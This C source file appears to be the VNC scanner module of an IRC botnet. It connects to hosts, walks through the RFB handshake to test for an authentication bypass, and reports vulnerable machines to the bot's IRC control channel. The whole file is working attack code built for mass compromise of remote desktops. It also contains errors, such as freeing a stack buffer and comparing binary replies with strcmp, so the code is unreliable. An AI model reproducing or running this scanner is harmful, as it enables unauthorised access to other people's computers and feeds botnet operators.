/*

VNC Scanner ported by D
Special thanks to NSA for his VNC Authentication Check. Some code taken out of it.

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_VNCSCANNER

//#pragma comment(lib, "ws2_32.lib")

#define MAX_RECV 128

char serv_rep_1[] = "RFB 003.008\n";
char serv_rep_2[] = "\x01\x02";
char serv_rep_3[] = "\x00\x00\x00\x00";
char cl_rep_1[] = "RFB 003.008\n";
char cl_rep_2[] = "\x01";

BOOL authbypass(EXINFO exinfo) {

    char recv_buffer[MAX_RECV];
    int nret;
   
    SOCKET vncsock = fsocket(AF_INET,SOCK_STREAM,0);
    if (vncsock == INVALID_SOCKET)
        return FALSE;
     
    struct sockaddr_in thataddr;   
    thataddr.sin_addr.s_addr = inet_addr(exinfo.ip);
    thataddr.sin_family = AF_INET;
    thataddr.sin_port = htons(exinfo.port);

    if (fconnect(vncsock, (LPSOCKADDR) &thataddr, sizeof(thataddr)) == SOCKET_ERROR) {
   fclosesocket(vncsock);
        return FALSE;
    }
   
    memset(recv_buffer, 0, sizeof(recv_buffer));
    nret = frecv(vncsock, recv_buffer, MAX_RECV, 0);
    if (nret <= 0 || nret == SOCKET_ERROR) {
   fclosesocket(vncsock);
        return FALSE;   
    }

    if (!strcmp(recv_buffer, serv_rep_1)) {
        fsend(vncsock, cl_rep_1, strlen(cl_rep_1), 0);
        memset(recv_buffer, 0, sizeof(recv_buffer));
        frecv(vncsock, recv_buffer, MAX_RECV, 0);
        if (!strcmp(recv_buffer, serv_rep_2)) {
            fsend(vncsock, cl_rep_2, strlen(cl_rep_2), 0);
            memset(recv_buffer, 0, sizeof(recv_buffer));
            frecv(vncsock, recv_buffer, MAX_RECV, 0);
            if (!strcmp(recv_buffer, serv_rep_3)) {
                char buffer[ IRCLINE ];
            _snprintf(buffer, sizeof(buffer), "Exploitable VNC: %s:%d.", exinfo.ip, exinfo.port );
            irc_privmsg(exinfo.sock, vncchan, buffer, exinfo.notice);
            addlog(buffer);
           exploit[exinfo.exploit].stats++;
      free(recv_buffer);
                fclosesocket(vncsock);
                return TRUE;
            }   
        }   
    }
   
    free(recv_buffer);
    fclosesocket(vncsock);
    return FALSE;
}

#endif